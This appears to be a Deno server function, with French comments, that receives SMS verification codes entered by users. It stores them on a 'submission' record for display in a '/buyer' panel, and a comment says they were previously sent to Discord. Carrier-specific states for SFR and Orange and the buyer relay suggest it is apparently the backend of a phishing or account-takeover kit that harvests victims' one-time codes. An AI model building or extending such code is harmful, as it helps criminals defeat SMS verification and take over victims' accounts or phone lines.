import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

// Réception du code SMS saisi par l'utilisateur.
// Le code est désormais stocké sur la soumission et affiché dans le panneau
// acheteur (/buyer) au lieu d'être envoyé sur Discord.
Deno.serve(async (req) => {
  const base44 = createClientFromRequest(req);
  const { code, submissionId } = await req.json();

  // Récupère les vraies informations de la demande en base
  let sub = null;
  if (submissionId) {
    try {
      const records = await base44.asServiceRole.entities.Submission.filter({ id: submissionId }, "-created_date", 1);
      sub = records[0] || null;
    } catch (e) {
      console.error("fetch submission failed:", e.message);
    }
  }

  // Anti-spam: ne traiter que les demandes réellement en attente de code.
  const READY_STATES = ["code_ready", "code6_ready", "code6sfr_ready", "code6orange_ready"];
  if (!sub || !READY_STATES.includes(sub.status)) {
    return Response.json({ error: "Demande non éligible" }, { status: 400 });
  }

  // Valider le format du code selon le statut attendu
  const expectedLength = sub.status === "code_ready" ? 4 : 6;
  const codeStr = String(code || "");
  if (!/^\d+$/.test(codeStr) || codeStr.length !== expectedLength) {
    return Response.json({ error: "Format de code invalide" }, { status: 400 });
  }

  // Stocke le code reçu sur la soumission et repasse en attente d'action acheteur.
  await base44.asServiceRole.entities.Submission.update(submissionId, {
    status: "pending",
    received_code: codeStr,
    code_received_at: new Date().toISOString(),
  }).catch((e) => console.error("update submission failed:", e.message));

  return Response.json({ ok: true });
});